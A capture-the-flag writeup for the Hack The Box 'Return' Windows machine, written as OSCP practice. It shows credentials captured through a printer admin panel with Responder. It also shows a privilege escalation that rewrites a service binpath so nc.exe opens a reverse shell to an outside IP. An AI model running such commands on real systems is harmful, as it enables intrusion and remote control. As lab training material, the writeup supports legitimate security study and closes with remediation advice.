---
layout: writeup
title: Return - HackTheBox
date: 2024-09-29 13:32:20 +0300
description: A Writeup of the Forest Box from HackTheBox
image: # /assets/images/Return/Return.png
fig-caption: # Add figcaption (optional)
tags: [TJ Null, LainKusanagi, Windows, Server Operators]
---

Today I'm doing a writeup for a [Hack The Box](https://app.hackthebox.com/profile/2013658) box from both TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)and LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called Return, and it is rated Easy by HackTheBox. As usual, we get started with an nmap scan. I'm using my own [custom script](https://github.com/pentestpop/verybasicenum/blob/main/vbnmap.sh) for this which (gives more detail but) shows these open ports:

```
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

Looks like we have a few different paths to go down. I add `return.local` to `/etc/hosts` and try the usual enum4linux, smb, rpc paths, and none of them go anywhere without auth so I visit the web page in the browser, and I see the HTB Printer Admin Panel. 

![Return2.png](/assets/images/Return/Return2.png){: .responsive-image}

The Fax and Troubleshooting pages go nowhere, but the settings page has a place to input some parameters.

![Return3.png](/assets/images/Return/Return3.png){: .responsive-image}

I don't have a different username or password yet obviously, but I can fiddle with the address. It won't download anything when I set up a python server, but if I run `sudo responder -I tun0` and enter my own IP into the Server Address field, I am able to capture what look like clear text credentials. 

![Return4.png](/assets/images/Return/Return4.png){: .responsive-image}

I check for SMB and WinRM access, and while I don't find anything interestingin SMB, I do have winrm access with this user. And it looks like we have some pretty interesting privileges:

![Return5.png](/assets/images/Return/Return5.png){: .responsive-image}

I tried to use SeBackupPrivilege to my advantage based on [hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens), but I couldn't get anything working so I ran winpeas to see if there was anything else I might be missing. One thing that stands out is that there are a ton (these are just a few) of services we can modify. 

![Return6.png](/assets/images/Return/Return6.png){: .responsive-image}

This is because the svc-printer user is in the Server Operators group. We see this output in winpeas, but we apparently are allowed to simply list the services, so we may need to just pick a few and try them. 

![Return7.png](/assets/images/Return/Return7.png){: .responsive-image}

I try a few of them - RmSVC, DFSR, CNG, but VSS or Volume Shadow Copy Service, actually works. You do need to upload or find nc.exe, but it's just as easy to upload it, espeically with evil-winrm, so I put it in our user's home. The commands are: 
- `sc.exe config EFS binpath="C:\windows\system32\cmd.exe /c C:\Users\svc-printer\nc.exe -e cmd 10.10.14.3 445"`
- `sc.exe stop VSS`
- `sc.exe start VSS`

And we get a shell. 

![Return8.png](/assets/images/Return/Return8.png){: .responsive-image}

### Lessons Learned
The foothold was pretty simple, but the privesc was a little trickier for me. I would just say I learned a new technique to use when our user is a member of the "Server Operators" group, and that VSS is a good service to abuse, perhaps in this case because we have SeBackupPrivilege, and VSS is integral to backup and recovery operations?

### Remediation Steps
- Patch the HTB Printer Admin Panel service
- At minimum don't allow it to send plaintext credentials
- Whitelist which IPs could be used for that
- The svc-printer user should not also be a member of the Server Operators group or have backup privileges. Service accounts should be restricted to what they are used for according to the principle of least privilege. 